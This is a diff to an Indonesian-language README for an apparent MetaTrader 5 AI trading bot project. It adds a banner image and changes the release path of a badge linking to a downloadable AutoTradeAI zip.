@@ -12,6 +12,12 @@
 
 <br>
 
+<div align="center">
+  <img src="trading_bot.png" width="100%" alt="Trading Bot AI">
+</div>
+
+<br>
+
 <p align="center">
   <b>Analisis pasar real-time, eksekusi otomatis, dan manajemen risiko cerdas</b><br>
   <i>— dalam satu dashboard —</i>
@@ -28,7 +34,7 @@
 <br>
 
 <p align="center">
-  <a href="https://github.com/ilmanalif/BOT-Trading-AI-Metatrader5/releases/download/File/AutoTradeAI.zip">
+  <a href="https://github.com/ilmanalif/BOT-Trading-AI-Metatrader5/releases/download/Bot/AutoTradeAI.zip">
     <img src="https://img.shields.io/badge/📥 Download%20AutoTradeAI.exe-FF6B35?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
